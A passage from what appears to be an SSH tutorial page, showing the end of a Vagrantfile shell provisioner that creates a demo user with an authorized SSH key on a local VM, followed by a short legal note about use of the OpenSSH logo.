class="sh" style="color:#e6db74">            useradd holden</span><br><span class="sh" style="color:#e6db74">            echo hauler | passwd holden --stdin</span><br><span class="sh" style="color:#e6db74">            mkdir -p /home/holden/.ssh</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rwx,go=' /home/holden/.ssh</span><br><span class="sh" style="color:#e6db74">            cp /vagrant/keys/holden.pub /home/holden/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chmod 'u=rw,go=' /home/holden/.ssh/authorized_keys</span><br><span class="sh" style="color:#e6db74">            chown -R holden:holden /home/holden/.ssh</span><br><span class="dl" style="color:#e6db74">            SHELL</span><br>        <span class="k" style="color:#66d9ef">end</span><br>    <span class="k" style="color:#66d9ef">end</span><br><span class="k" style="color:#66d9ef">end</span><br></pre></div>
</td>
</tr>
</table>

## Legal

The OpenSSH logo was pulled [directly from its website](https://www.openssh.com/) and was not altered. I couldn't find a license but I'm assuming the logo is [covered by a BSD license of some sort](https://en.wikipedia.org/wiki/BSD_licenses). I'm not affiliated with OpenSSH at all.